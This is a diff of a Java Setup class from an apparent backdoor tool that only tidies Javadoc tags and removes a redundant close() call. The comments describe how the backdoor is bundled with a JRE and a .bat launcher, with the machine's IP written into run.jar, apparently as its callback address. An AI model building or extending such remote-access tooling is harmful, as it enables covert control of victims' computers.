@@ -24,16 +24,16 @@ public class Setup {
 	/**
 	 * Sets up backdoor.
 	 * <p>
-	 * If {@link packageJre} is true, copies the current machines JRE to directory
-	 * 'backdoor' and {@link #createBat(String, String, String)} is used to create a
-	 * '.bat' file for running the backdoor in the JRE. If {@link packageJre} is
+	 * If {@code packageJre} is true, copies the current machines JRE to directory
+	 * 'backdoor' and {@code #createBat(String, String, String)} is used to create a
+	 * '.bat' file for running the backdoor in the JRE. If {@code packageJre} is
 	 * false but directory 'jre' containing a Windows JRE distribution exists, 'jre'
-	 * is copied to 'backdoor' and {@link #createBat(String, String, String)} is
+	 * is copied to 'backdoor' and {@code #createBat(String, String, String)} is
 	 * used to create a '.bat' file for running the backdoor in the JRE. 'run.jar'
 	 * is copied from 'target' to 'backdoor' and 'ip' is appended into it using
-	 * {@link #appendJar(String, String, String)}. If {@link ipType} is "internal",
+	 * {@code #appendJar(String, String, String)}. If {@code ipType} is "internal",
 	 * 'ip' will contain the internal IP address of the current machine. Otherwise,
-	 * if {@link ipType} is "external", 'ip' will contain the external IP address of
+	 * if {@code ipType} is "external", 'ip' will contain the external IP address of
 	 * the current machine.
 	 * 
 	 * @param packageJre if a JRE should be packaged with the backdoor
@@ -75,8 +75,8 @@ public class Setup {
 	}
 
 	/**
-	 * Appends a new file with name {@link filename} and contents
-	 * {@link fileContents} into existing jar file with name {@link jarFile}.
+	 * Appends a new file with name {@code filename} and contents
+	 * {@code fileContents} into existing jar file with name {@code jarFile}.
 	 * 
 	 * @param jarFile      name of jar file to append
 	 * @param filename     name of new file to append in jar
@@ -90,7 +90,6 @@ public class Setup {
 			try (Writer writer = Files.newBufferedWriter(fileSystem.getPath(filename), StandardCharsets.UTF_8,
 					StandardOpenOption.CREATE)) {
 				writer.write(fileContents);
-				writer.close();
 			}
 		}
 	}
